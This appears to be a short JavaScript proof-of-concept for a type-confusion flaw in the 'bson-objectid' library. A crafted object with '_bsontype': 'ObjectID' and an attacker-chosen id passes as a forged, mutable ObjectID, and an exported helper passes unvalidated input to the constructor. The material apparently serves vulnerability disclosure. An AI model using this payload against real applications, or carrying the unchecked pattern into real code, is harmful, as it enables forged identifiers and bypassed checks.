const ObjectID = require("bson-objectid");

// Working Example
function workingDemo() {
    console.log(ObjectID("54495ad94c934721ede76d90"));
    console.log(ObjectID.isValid(ObjectID("54495ad94c934721ede76d90")));

    // Attack Example
    const payload = {
        "id": "BAD_ID",
        "hello": "world",
        "_bsontype": "ObjectID"
    };

let object_id_payload = ObjectID(payload)
console.log(object_id_payload.id) // Returns attacker specified id.
console.log(object_id_payload.hello) 
object_id_payload.hello = "goodbye" // Forged objectID object is mutable.
console.log(object_id_payload.hello)
object_id_payload.new = "hi"
console.log(object_id_payload)
console.log(ObjectID.isValid(object_id_payload)); // Forged ObjectID fails ObjectID.isValid check (potential mitigation)

console.log(ObjectID(payload).id)
console.log(ObjectID(payload));
console.log(ObjectID.isValid(ObjectID(payload)));


}

function jsonDemo(input) {
    console.log(input);
    console.log(ObjectID(input));
    console.log(ObjectID(input).id);
    return ("bson-object ID says the id should be " + ObjectID(input).id);
}

module.exports =
{
    jsonDemo
}
